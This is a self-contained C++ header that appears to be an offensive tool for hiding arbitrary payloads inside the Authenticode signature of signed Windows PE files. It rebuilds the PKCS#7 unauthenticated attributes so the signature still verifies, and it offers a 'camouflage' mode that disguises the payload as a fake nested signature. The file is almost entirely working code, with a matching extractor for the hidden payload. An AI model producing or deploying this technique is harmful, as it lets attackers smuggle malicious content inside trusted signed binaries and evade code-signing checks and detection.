#pragma once
// pkcs7_embed.h — Minimal hand-rolled ASN.1 DER PKCS#7 embed/extract
// Zero dependencies beyond <cstdint>, <cstring>, <vector>, <string>, <fstream>
// ponytail: no OpenSSL, no mbedtls — just TLV parsing and byte splicing

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>
#include <string>
#include <fstream>
#include <iterator>

namespace pkcs7 {

// ---- DER TLV primitives ----

struct Child {
    size_t pos;             // offset of tag byte in buffer
    uint8_t tag;
    size_t content_offset;  // offset of content in buffer
    size_t content_length;
    size_t total() const { return (content_offset - pos) + content_length; }
};

inline bool parse_tl(const uint8_t* data, size_t data_len, size_t pos,
                     uint8_t& tag, size_t& content_offset, size_t& content_length) {
    if (pos >= data_len) return false;
    tag = data[pos];
    size_t p = pos + 1;
    if (p >= data_len) return false;
    uint8_t first = data[p++];
    if (first < 0x80) {
        content_length = first;
    } else {
        int n = first & 0x7F;
        if (n == 0 || n > 4 || p + n > data_len) return false;
        content_length = 0;
        for (int i = 0; i < n; i++)
            content_length = (content_length << 8) | data[p++];
    }
    content_offset = p;
    return content_offset + content_length <= data_len;
}

inline std::vector<uint8_t> encode_length(size_t len) {
    std::vector<uint8_t> out;
    if (len < 0x80) {
        out.push_back((uint8_t)len);
    } else if (len < 0x100) {
        out.push_back(0x81); out.push_back((uint8_t)len);
    } else if (len < 0x10000) {
        out.push_back(0x82); out.push_back((uint8_t)(len >> 8)); out.push_back((uint8_t)len);
    } else if (len < 0x1000000) {
        out.push_back(0x83);
        out.push_back((uint8_t)(len >> 16)); out.push_back((uint8_t)(len >> 8)); out.push_back((uint8_t)len);
    } else {
        out.push_back(0x84);
        out.push_back((uint8_t)(len >> 24)); out.push_back((uint8_t)(len >> 16));
        out.push_back((uint8_t)(len >> 8)); out.push_back((uint8_t)len);
    }
    return out;
}

inline std::vector<uint8_t> make_tlv(uint8_t tag, const std::vector<uint8_t>& content) {
    std::vector<uint8_t> out;
    out.push_back(tag);
    auto l = encode_length(content.size());
    out.insert(out.end(), l.begin(), l.end());
    out.insert(out.end(), content.begin(), content.end());
    return out;
}

inline std::vector<uint8_t> make_tlv(uint8_t tag, const uint8_t* d, size_t n) {
    return make_tlv(tag, std::vector<uint8_t>(d, d + n));
}

inline std::vector<Child> parse_children(const uint8_t* data, size_t data_len,
                                          size_t start, size_t end) {
    std::vector<Child> out;
    size_t p = start;
    while (p < end) {
        Child c; c.pos = p;
        if (!parse_tl(data, data_len, p, c.tag, c.content_offset, c.content_length)) break;
        out.push_back(c);
        p = c.content_offset + c.content_length;
    }
    return out;
}

inline std::vector<uint8_t> slice(const uint8_t* d, size_t off, size_t len) {
    return {d + off, d + off + len};
}

// ---- OID encoding ----

inline std::vector<uint8_t> encode_oid_value(const std::string& dotted) {
    std::vector<uint32_t> parts;
    size_t s = 0;
    for (size_t i = 0; i <= dotted.size(); i++) {
        if (i == dotted.size() || dotted[i] == '.') {
            parts.push_back((uint32_t)std::stoul(dotted.substr(s, i - s)));
            s = i + 1;
        }
    }
    if (parts.size() < 2) return {};
    std::vector<uint8_t> out;
    out.push_back((uint8_t)(40 * parts[0] + parts[1]));
    for (size_t i = 2; i < parts.size(); i++) {
        uint32_t v = parts[i];
        uint8_t buf[5]; int n = 0;
        buf[n++] = v & 0x7F; v >>= 7;
        while (v > 0) { buf[n++] = 0x80 | (v & 0x7F); v >>= 7; }
        for (int j = n - 1; j >= 0; j--) out.push_back(buf[j]);
    }
    return out;
}

inline std::vector<uint8_t> encode_oid(const std::string& dotted) {
    return make_tlv(0x06, encode_oid_value(dotted));
}

inline bool oid_matches(const uint8_t* data, size_t data_len, size_t pos,
                        const std::vector<uint8_t>& expected_val) {
    uint8_t tag; size_t co, cl;
    if (!parse_tl(data, data_len, pos, tag, co, cl)) return false;
    if (tag != 0x06 || cl != expected_val.size()) return false;
    return memcmp(data + co, expected_val.data(), cl) == 0;
}

// ---- PKCS#7 structure navigation ----

struct PKCS7Nav {
    // ContentInfo top-level SEQUENCE
    size_t ci_co, ci_cl;
    // [0] EXPLICIT wrapper around SignedData
    size_t expl_pos, expl_co, expl_cl;
    // SignedData SEQUENCE
    size_t sd_pos, sd_co, sd_cl;
    // Raw spans of SignedData children before signerInfos
    std::vector<std::pair<size_t,size_t>> sd_prefix;
    // signerInfos SET
    size_t si_co, si_cl;
    // First SignerInfo SEQUENCE
    size_t s0_co, s0_cl;
    // End of signer0 body (before unsignedAttrs)
    size_t s0_body_end;
    // unsignedAttrs [1] IMPLICIT
    bool has_unauth;
    size_t ua_co, ua_cl;
    // Other signerInfos raw bytes
    size_t other_si_start, other_si_end;
};

inline bool navigate(const uint8_t* d, size_t dl, PKCS7Nav& nav) {
    uint8_t tag;
    // ContentInfo SEQUENCE
    if (!parse_tl(d, dl, 0, tag, nav.ci_co, nav.ci_cl) || tag != 0x30) return false;

    auto ci = parse_children(d, dl, nav.ci_co, nav.ci_co + nav.ci_cl);
    if (ci.size() < 2 || ci[1].tag != 0xA0) return false;
    nav.expl_pos = ci[1].pos; nav.expl_co = ci[1].content_offset; nav.expl_cl = ci[1].content_length;

    // SignedData SEQUENCE inside [0]
    if (!parse_tl(d, dl, nav.expl_co, tag, nav.sd_co, nav.sd_cl) || tag != 0x30) return false;
    nav.sd_pos = nav.expl_co;

    auto sd = parse_children(d, dl, nav.sd_co, nav.sd_co + nav.sd_cl);

    // signerInfos is the last SET (0x31) in SignedData
    int si_idx = -1;
    for (int i = (int)sd.size() - 1; i >= 0; i--)
        if (sd[i].tag == 0x31) { si_idx = i; break; }
    if (si_idx < 0) return false;

    nav.sd_prefix.clear();
    for (int i = 0; i < si_idx; i++)
        nav.sd_prefix.push_back({sd[i].pos, sd[i].total()});

    nav.si_co = sd[si_idx].content_offset;
    nav.si_cl = sd[si_idx].content_length;

    // First SignerInfo
    auto sis = parse_children(d, dl, nav.si_co, nav.si_co + nav.si_cl);
    if (sis.empty() || sis[0].tag != 0x30) return false;
    nav.s0_co = sis[0].content_offset;
    nav.s0_cl = sis[0].content_length;

    // Other signerInfos
    if (sis.size() > 1) {
        nav.other_si_start = sis[1].pos;
        nav.other_si_end = sis.back().pos + sis.back().total();
    } else {
        nav.other_si_start = nav.other_si_end = nav.si_co + nav.si_cl;
    }

    // Find [1] IMPLICIT (0xA1) in signer0
    nav.has_unauth = false;
    nav.s0_body_end = nav.s0_co + nav.s0_cl;
    auto s0 = parse_children(d, dl, nav.s0_co, nav.s0_co + nav.s0_cl);
    for (auto& c : s0) {
        if (c.tag == 0xA1) {
            nav.has_unauth = true;
            nav.ua_co = c.content_offset;
            nav.ua_cl = c.content_length;
            nav.s0_body_end = c.pos;
            break;
        }
    }
    return true;
}

// ---- Rebuild PKCS#7 with modified unsignedAttrs ----

inline std::vector<uint8_t> rebuild(const uint8_t* d, size_t dl,
                                     const PKCS7Nav& nav,
                                     const std::vector<uint8_t>& new_ua_content) {
    // Signer0: body + new [1]
    std::vector<uint8_t> s0c(d + nav.s0_co, d + nav.s0_body_end);
    if (!new_ua_content.empty()) {
        auto ua = make_tlv(0xA1, new_ua_content);
        s0c.insert(s0c.end(), ua.begin(), ua.end());
    }
    auto s0 = make_tlv(0x30, s0c);

    // signerInfos SET
    std::vector<uint8_t> sic;
    sic.insert(sic.end(), s0.begin(), s0.end());
    if (nav.other_si_end > nav.other_si_start)
        sic.insert(sic.end(), d + nav.other_si_start, d + nav.other_si_end);
    auto si = make_tlv(0x31, sic);

    // SignedData
    std::vector<uint8_t> sdc;
    for (auto& [off, len] : nav.sd_prefix)
        sdc.insert(sdc.end(), d + off, d + off + len);
    sdc.insert(sdc.end(), si.begin(), si.end());
    auto sd = make_tlv(0x30, sdc);

    // [0] EXPLICIT
    auto expl = make_tlv(0xA0, sd);

    // ContentInfo: preserve original OID TLV
    auto ci_kids = parse_children(d, dl, nav.ci_co, nav.ci_co + nav.ci_cl);
    auto oid_raw = slice(d, ci_kids[0].pos, ci_kids[0].total());
    std::vector<uint8_t> cic;
    cic.insert(cic.end(), oid_raw.begin(), oid_raw.end());
    cic.insert(cic.end(), expl.begin(), expl.end());
    return make_tlv(0x30, cic);
}

// ---- Camouflage: fake nested SignedData wrapper ----

inline std::vector<uint8_t> wrap_nested(const uint8_t* payload, size_t len) {
    // version: 1
    std::vector<uint8_t> ver = {0x02, 0x01, 0x01};
    // digestAlgorithms: { sha256 }
    auto sha = make_tlv(0x30, encode_oid("2.16.840.1.101.3.4.2.1"));
    auto da = make_tlv(0x31, sha);
    // encapContentInfo: { data OID, [0]{ OCTET STRING{ payload } } }
    auto doid = encode_oid("1.2.840.113549.1.7.1");
    auto oct = make_tlv(0x04, payload, len);
    auto ex0 = make_tlv(0xA0, oct);
    std::vector<uint8_t> ec; ec.insert(ec.end(), doid.begin(), doid.end());
    ec.insert(ec.end(), ex0.begin(), ex0.end());
    auto ecsi = make_tlv(0x30, ec);
    // signerInfos: empty SET
    auto sis = make_tlv(0x31, std::vector<uint8_t>{});
    // SignedData
    std::vector<uint8_t> sdc;
    for (auto* v : {&ver, &da, &ecsi, &sis})
        sdc.insert(sdc.end(), v->begin(), v->end());
    auto sd = make_tlv(0x30, sdc);
    // ContentInfo { signedData OID, [0]{ SignedData } }
    auto sdoid = encode_oid("1.2.840.113549.1.7.2");
    auto exsd = make_tlv(0xA0, sd);
    std::vector<uint8_t> cic;
    cic.insert(cic.end(), sdoid.begin(), sdoid.end());
    cic.insert(cic.end(), exsd.begin(), exsd.end());
    return make_tlv(0x30, cic);
}

inline std::vector<uint8_t> unwrap_nested(const uint8_t* d, size_t dl) {
    uint8_t t; size_t co, cl;
    // ContentInfo SEQUENCE
    if (!parse_tl(d, dl, 0, t, co, cl) || t != 0x30) return {};
    auto ci = parse_children(d, dl, co, co + cl);
    if (ci.size() < 2 || ci[1].tag != 0xA0) return {};
    // SignedData SEQUENCE
    auto sd_outer = parse_children(d, dl, ci[1].content_offset, ci[1].content_offset + ci[1].content_length);
    if (sd_outer.empty() || sd_outer[0].tag != 0x30) return {};
    auto sd = parse_children(d, dl, sd_outer[0].content_offset, sd_outer[0].content_offset + sd_outer[0].content_length);
    if (sd.size() < 3 || sd[2].tag != 0x30) return {};
    // encapContentInfo children: OID + [0]{OCTET STRING}
    auto ec = parse_children(d, dl, sd[2].content_offset, sd[2].content_offset + sd[2].content_length);
    if (ec.size() < 2 || ec[1].tag != 0xA0) return {};
    auto inner = parse_children(d, dl, ec[1].content_offset, ec[1].content_offset + ec[1].content_length);
    if (inner.empty() || inner[0].tag != 0x04) return {};
    return slice(d, inner[0].content_offset, inner[0].content_length);
}

// ---- CMS attribute builder ----

inline std::vector<uint8_t> build_attr(const std::string& oid, const std::vector<uint8_t>& value_der) {
    auto o = encode_oid(oid);
    auto s = make_tlv(0x31, value_der);
    std::vector<uint8_t> c;
    c.insert(c.end(), o.begin(), o.end());
    c.insert(c.end(), s.begin(), s.end());
    return make_tlv(0x30, c);
}

// ---- PE cert manipulation ----

struct PECert {
    uint32_t dir_offset; // file offset of DataDirectory[4]
    uint32_t rva;        // file offset of WIN_CERTIFICATE (note: NOT a real RVA)
    uint32_t size;
};

inline bool pe_cert_info(const uint8_t* d, size_t dl, PECert& out) {
    if (dl < 0x40 || d[0] != 'M' || d[1] != 'Z') return false;
    uint32_t pe; memcpy(&pe, d + 0x3C, 4);
    if (pe + 0x1C > dl || memcmp(d + pe, "PE\0\0", 4)) return false;
    uint16_t magic; memcpy(&magic, d + pe + 0x18, 2);
    if (magic == 0x20b)      out.dir_offset = pe + 0x18 + 0x90;
    else if (magic == 0x10b) out.dir_offset = pe + 0x18 + 0x80;
    else return false;
    if (out.dir_offset + 8 > dl) return false;
    memcpy(&out.rva, d + out.dir_offset, 4);
    memcpy(&out.size, d + out.dir_offset + 4, 4);
    return true;
}

inline bool pe_pkcs7(const uint8_t* d, size_t dl, const PECert& c,
                     const uint8_t*& p7, size_t& p7len) {
    if (c.rva == 0 || c.size == 0 || c.rva + c.size > dl) return false;
    uint32_t dw; memcpy(&dw, d + c.rva, 4);
    uint16_t wt; memcpy(&wt, d + c.rva + 6, 2);
    if (wt != 0x0002) return false; // not PKCS#7
    p7 = d + c.rva + 8;
    p7len = dw - 8;
    return true;
}

inline std::vector<uint8_t> pe_rebuild(const uint8_t* d, size_t dl,
                                        const PECert& c,
                                        const std::vector<uint8_t>& new_p7) {
    uint32_t dw = 8 + (uint32_t)new_p7.size();
    uint32_t pad = (8 - (dw % 8)) % 8;
    uint16_t rev = 0x0200, wt = 0x0002;

    std::vector<uint8_t> out(d, d + c.rva);
    out.resize(out.size() + 8);
    memcpy(&out[c.rva], &dw, 4);
    memcpy(&out[c.rva + 4], &rev, 2);
    memcpy(&out[c.rva + 6], &wt, 2);
    out.insert(out.end(), new_p7.begin(), new_p7.end());
    out.resize(out.size() + pad, 0);

    uint32_t wc_total = (uint32_t)(out.size() - c.rva);
    memcpy(&out[c.dir_offset], &c.rva, 4);
    memcpy(&out[c.dir_offset + 4], &wc_total, 4);
    return out;
}

// ---- Public API ----

inline bool embed(const std::string& pe_in, const std::string& payload_path,
                  const std::string& pe_out, const std::string& oid,
                  bool camouflage, bool verbose) {
    std::ifstream f1(pe_in, std::ios::binary);
    if (!f1) { std::fprintf(stderr, "[-] Cannot open %s\n", pe_in.c_str()); return false; }
    std::vector<uint8_t> pe((std::istreambuf_iterator<char>(f1)), {});
    f1.close();

    std::ifstream f2(payload_path, std::ios::binary);
    if (!f2) { std::fprintf(stderr, "[-] Cannot open %s\n", payload_path.c_str()); return false; }
    std::vector<uint8_t> payload((std::istreambuf_iterator<char>(f2)), {});
    f2.close();

    PECert ci;
    if (!pe_cert_info(pe.data(), pe.size(), ci) || ci.rva == 0 || ci.size == 0) {
        std::fprintf(stderr, "[-] PE has no embedded signature\n"); return false;
    }
    const uint8_t* p7; size_t p7len;
    if (!pe_pkcs7(pe.data(), pe.size(), ci, p7, p7len)) {
        std::fprintf(stderr, "[-] Failed to extract PKCS#7\n"); return false;
    }

    PKCS7Nav nav;
    if (!navigate(p7, p7len, nav)) {
        std::fprintf(stderr, "[-] Failed to parse PKCS#7 structure\n"); return false;
    }

    std::string use_oid = camouflage ? "1.3.6.1.4.1.311.2.4.1" : oid;
    std::vector<uint8_t> val;
    if (camouflage)
        val = wrap_nested(payload.data(), payload.size());
    else
        val = make_tlv(0x04, payload.data(), payload.size()); // OCTET STRING

    auto attr = build_attr(use_oid, val);

    // Build new unsignedAttrs content: keep existing (minus same OID) + new
    auto target_oid = encode_oid_value(use_oid);
    std::vector<uint8_t> ua_content;
    if (nav.has_unauth) {
        for (auto& a : parse_children(p7, p7len, nav.ua_co, nav.ua_co + nav.ua_cl)) {
            auto kids = parse_children(p7, p7len, a.content_offset, a.content_offset + a.content_length);
            if (!kids.empty() && oid_matches(p7, p7len, kids[0].pos, target_oid))
                continue; // replace
            auto raw = slice(p7, a.pos, a.total());
            ua_content.insert(ua_content.end(), raw.begin(), raw.end());
        }
    }
    ua_content.insert(ua_content.end(), attr.begin(), attr.end());

    auto new_p7 = rebuild(p7, p7len, nav, ua_content);
    auto new_pe = pe_rebuild(pe.data(), pe.size(), ci, new_p7);

    std::ofstream fo(pe_out, std::ios::binary);
    if (!fo) { std::fprintf(stderr, "[-] Cannot write %s\n", pe_out.c_str()); return false; }
    fo.write(reinterpret_cast<const char*>(new_pe.data()), (std::streamsize)new_pe.size());
    fo.close();

    const char* mode = camouflage ? "camouflage (SPC_NESTED_SIGNATURE)" : "direct";
    std::printf("[+] Embedded %zu bytes [%s] (OID: %s) into %s\n",
                payload.size(), mode, use_oid.c_str(), pe_out.c_str());
    std::printf("[*] Delta: +%lld bytes. Signature remains valid.\n",
                (long long)new_pe.size() - (long long)pe.size());
    return true;
}

inline bool extract(const std::string& pe_in, const std::string& out_path,
                    const std::string& oid, bool camouflage, bool verbose) {
    std::ifstream f1(pe_in, std::ios::binary);
    if (!f1) { std::fprintf(stderr, "[-] Cannot open %s\n", pe_in.c_str()); return false; }
    std::vector<uint8_t> pe((std::istreambuf_iterator<char>(f1)), {});
    f1.close();

    PECert ci;
    if (!pe_cert_info(pe.data(), pe.size(), ci) || ci.rva == 0 || ci.size == 0) {
        std::fprintf(stderr, "[-] PE has no embedded signature\n"); return false;
    }
    const uint8_t* p7; size_t p7len;
    if (!pe_pkcs7(pe.data(), pe.size(), ci, p7, p7len)) {
        std::fprintf(stderr, "[-] Failed to extract PKCS#7\n"); return false;
    }

    PKCS7Nav nav;
    if (!navigate(p7, p7len, nav)) {
        std::fprintf(stderr, "[-] Failed to parse PKCS#7 structure\n"); return false;
    }
    if (!nav.has_unauth) {
        std::fprintf(stderr, "[-] No unauthenticated attributes found\n"); return false;
    }

    std::string use_oid = camouflage ? "1.3.6.1.4.1.311.2.4.1" : oid;
    auto target_oid = encode_oid_value(use_oid);

    for (auto& a : parse_children(p7, p7len, nav.ua_co, nav.ua_co + nav.ua_cl)) {
        if (a.tag != 0x30) continue;
        auto kids = parse_children(p7, p7len, a.content_offset, a.content_offset + a.content_length);
        if (kids.size() < 2 || !oid_matches(p7, p7len, kids[0].pos, target_oid)) continue;
        if (kids[1].tag != 0x31) continue;

        auto vals = parse_children(p7, p7len, kids[1].content_offset,
                                   kids[1].content_offset + kids[1].content_length);
        if (vals.empty()) continue;

        std::vector<uint8_t> payload;
        if (camouflage) {
            auto nested = slice(p7, vals[0].pos, vals[0].total());
            payload = unwrap_nested(nested.data(), nested.size());
        } else {
            if (vals[0].tag == 0x04)
                payload = slice(p7, vals[0].content_offset, vals[0].content_length);
            else
                payload = slice(p7, vals[0].pos, vals[0].total());
        }
        if (payload.empty()) {
            std::fprintf(stderr, "[-] Found attribute but payload is empty\n"); return false;
        }

        std::ofstream fo(out_path, std::ios::binary);
        if (!fo) { std::fprintf(stderr, "[-] Cannot write %s\n", out_path.c_str()); return false; }
        fo.write(reinterpret_cast<const char*>(payload.data()), (std::streamsize)payload.size());
        fo.close();
        std::printf("[+] Extracted %zu bytes to %s\n", payload.size(), out_path.c_str());
        return true;
    }

    std::fprintf(stderr, "[-] No payload found with OID %s\n", use_oid.c_str());
    return false;
}

} // namespace pkcs7
